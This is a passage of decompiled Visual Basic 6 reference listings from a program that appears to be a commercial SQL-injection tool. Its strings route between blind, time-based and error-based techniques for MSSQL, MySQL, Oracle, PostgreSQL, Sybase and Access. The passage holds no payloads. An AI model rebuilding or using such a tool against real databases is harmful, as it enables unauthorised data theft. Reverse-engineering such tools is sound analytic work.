'N  * ref: "Oracle"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_655
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_172()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: "DB Server: "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Resp. Time(avg):"
'N  * ref: vbTab
'N  * ref: Subr_162
'N  * ref: Round(
'N  * ref: " ms"
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: Right(
'N  * ref: "with error"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: Subr_200
'N  * ref: __vbaFreeVar
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: "MySQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: Subr_680
'N  * ref: __vbaFreeVar
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaBoolVarNull
'N  * ref: Subr_214
'N  * ref: __vbaFreeVar
'N  * ref: "MsSQL no error"
'N  * ref: __vbaStrCmp
'N  * ref: "MSSQL no error"
'N  * ref: Subr_232
'N  * ref: __vbaFreeVar
'N  * ref: "MsSQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: "MsSQL Blind"
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_694
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: "Sybase (ASE) Blind"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_694
'N  * ref: __vbaFreeVar
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_728
'N  * ref: __vbaFreeVar
'N  * ref: LCase(
'N  * ref: "msaccess"
'N  * ref: LCase(
'N  * ref: "msaccess blind"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_647
'N  * ref: __vbaFreeVar
'N  * ref: "Oracle"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_658
'N  * ref: __vbaFreeVar
'N  * ref: "Oracle error based"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_719
'N  * ref: __vbaFreeVar
'N  * ref: "PostgreSQL"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_707
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_173()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: Right(
'N  * ref: "with error"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_202
'N  * ref: __vbaFreeVar
'N  * ref: "MsSQL no error"
'N  * ref: __vbaStrCmp
'N  * ref: "MSSQL no error"
'N  * ref: Subr_234
'N  * ref: __vbaFreeVar
'N  * ref: "MsSQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: "MsSQL Blind"
'N  * ref: Left(
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_695
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrMove
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: "Sybase (ASE) Blind"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_695
'N  * ref: __vbaFreeVar
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_729
'N  * ref: __vbaFreeVar
'N  * ref: Left(
'N  * ref: "mysql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "MySQL >=5"
'N  * ref: __vbaStrCmp
'N  * ref: "MySQL"
'N  * ref: "MySQL unknown ver"
'N  * ref: __vbaStrCmp
'N  * ref: "MySQL error based"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_216
'N  * ref: __vbaFreeVar
'N  * ref: "MySQL >=4.1"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_242
'N  * ref: Left(
'N  * ref: "mysql"
'N  * ref: "MySQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_681
'N  * ref: __vbaFreeVar
'N  * ref: "msaccess"
'N  * ref: "msaccess blind"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_648
'N  * ref: __vbaFreeVar
'N  * ref: "Oracle"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_659
'N  * ref: __vbaFreeVar
'N  * ref: "Oracle error based"
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_720
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: "PostgreSQL"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_708
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_174()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: Right(
'N  * ref: "with error"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_199
'N  * ref: __vbaFreeVar
'N  * ref: "MsSQL no error"
'N  * ref: __vbaStrCmp
'N  * ref: "MSSQL no error"
'N  * ref: Subr_231
'N  * ref: __vbaFreeVar
'N  * ref: "MsSQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: "MsSQL Blind"
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_693
'N  * ref: __vbaFreeVar
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: "Sybase (ASE) Blind"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_693
'N  * ref: __vbaFreeVar
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_727
'N  * ref: __vbaFreeVar
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_213
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: "MySQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_679
'N  * ref: __vbaFreeVar
'N  * ref: "Oracle"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_657
'N  * ref: __vbaFreeVar
'N  * ref: "Oracle error based"
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_717
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrMove
'N  * ref: "PostgreSQL"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_706
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_175()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: Right(
'N  * ref: "with error"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_203
'N  * ref: __vbaFreeVar
'N  * ref: "MSSQL no error"
'N  * ref: "MsSQL no error"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: Subr_235
'N  * ref: __vbaFreeVar
'N  * ref: "MsSQL Blind"
'N  * ref: "MsSQL time based"
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_696
'N  * ref: __vbaFreeVar
'N  * ref: "Sybase (ASE)"
'N  * ref: "Sybase (ASE) Blind"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_696
'N  * ref: __vbaFreeVar
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: Subr_730
'N  * ref: __vbaFreeVar
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "MySQL"
'N  * ref: "MySQL >=5"
'N  * ref: "MySQL unknown ver"
'N  * ref: "MySQL error based"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: Subr_218
'N  * ref: __vbaFreeVar
'N  * ref: "MySQL >=4.1"
'N  * ref: __vbaVarTstEq
'N  * ref: Subr_243
'N  * ref: __vbaFreeVar
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: "MySQL time based"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_682
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarVargNofree
'N  * ref: LCase(
'N  * ref: "msaccess"
'N  * ref: LCase(
'N  * ref: "msaccess blind"
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_649
'N  * ref: __vbaFreeVar
'N  * ref: "Oracle"
'N  * ref: __vbaVarTstEq
'N  * ref: Subr_660
'N  * ref: __vbaFreeVar
'N  * ref: "Oracle error based"
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_721
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: "PostgreSQL"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarTstEq
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_709
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_176()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: Right(
'N  * ref: "with error"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_205
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarMove
'N  * ref: "MsSQL no error"
'N  * ref: __vbaStrCmp
'N  * ref: "MSSQL no error"
'N  * ref: Subr_237
'N  * ref: "MsSQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: "MsSQL Blind"
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_698
'N  * ref: __vbaStrMove
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: "Sybase (ASE) Blind"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_698
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarDup
'N  * ref: Subr_732
'N  * ref: __vbaFreeVar
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: Subr_220
'N  * ref: __vbaFreeVar
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: "MySQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_684
'N  * ref: __vbaStrMove
'N  * ref: LCase(
'N  * ref: "msaccess"
'N  * ref: LCase(
'N  * ref: "msaccess blind"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_650
'N  * ref: "Oracle"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_661
'N  * ref: "Oracle error based"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_722
'N  * ref: "PostgreSQL"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarDup
'N  * ref: Subr_710
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_177()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: Right(
'N  * ref: "with error"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_204
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarMove
'N  * ref: "MsSQL no error"
'N  * ref: __vbaStrCmp
'N  * ref: "MSSQL no error"
'N  * ref: Subr_236
'N  * ref: "MsSQL time based"
'N  * ref: __vbaStrCmp
'N  * ref: "MsSQL Blind"
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_697
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrBool
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: "Sybase (ASE) Blind"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_697
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_731
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "mysql"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_221
'N  * ref: Subr_683
'N  * ref: LCase(
'N  * ref: "msaccess"
'N  * ref: LCase(
'N  * ref: "msaccess blind"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_651
'N  * ref: "Oracle"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_662
'N  * ref: "Oracle error based"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_723
'N  * ref: "PostgreSQL"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: Subr_711
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_178()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: "MSSQL 2000 with error"
'N  * ref: "MSSQL 2005 with error"
'N  * ref: "MSSQL no error"
